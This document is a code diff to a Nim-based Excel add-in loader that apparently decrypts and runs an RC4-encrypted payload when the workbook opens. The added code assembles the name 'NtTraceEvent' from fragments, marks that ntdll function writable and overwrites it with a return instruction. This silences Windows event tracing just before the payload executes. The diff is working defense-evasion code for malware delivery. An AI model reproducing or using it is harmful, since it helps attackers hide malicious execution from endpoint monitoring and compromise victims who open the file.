@@ -3,11 +3,17 @@ import nimcrypto
 import includes/DLoader
 import includes/rc4
 import strutils
+import dynlib
 
 func toByteSeq*(str: string): seq[byte] {.inline.} =
   ## Converts a string to the corresponding byte sequence.
   @(str.toOpenArrayByte(0, str.high))
 
+when defined amd64:
+    const patch: array[1, byte] = [byte 0xc3]
+elif defined i386:
+    const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
+    
 # const encContent = slurp("encContent.bin")
 
 var currentModule: HINSTANCE
@@ -56,6 +62,38 @@ var k32Addr: HANDLE = get_library_address()
 
 VirtualAlloc_p = cast[VirtualAlloc_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), VirtAl)))
 VirtualProtect_p = cast[VirtualProtect_t](cast[LPVOID](get_function_address(cast[HMODULE](k32Addr), VirtPr)))
+
+proc Patchn(): bool =
+    var
+        ntdll: LibHandle
+        cs: pointer
+        op: DWORD
+        t: DWORD
+        trace: string
+        ntd: string
+        disabled: bool = false
+
+    trace.add("Nt")
+    trace.add("Trace")
+    trace.add("Event")
+    
+    ntd.add("nt")
+    ntd.add("dll")
+
+    ntdll = loadLib(ntd)
+    if isNil(ntdll):
+        return disabled
+
+    cs = ntdll.symAddr(trace.cstring)
+    if isNil(cs):
+        return disabled
+
+    if VirtualProtect_p(cs, patch.len, 0x40, addr op):
+        copyMem(cs, unsafeAddr patch, patch.len)
+        discard VirtualProtect_p(cs, patch.len, op, addr t)
+        disabled = true
+
+    return disabled
 
 proc NimMain() {.cdecl, importc.}
 
@@ -116,4 +154,5 @@ proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL 
   return true
 
 proc xlAutoOpen() {.stdcall, exportc, dynlib.} =
+    discard Patchn()
     execute()
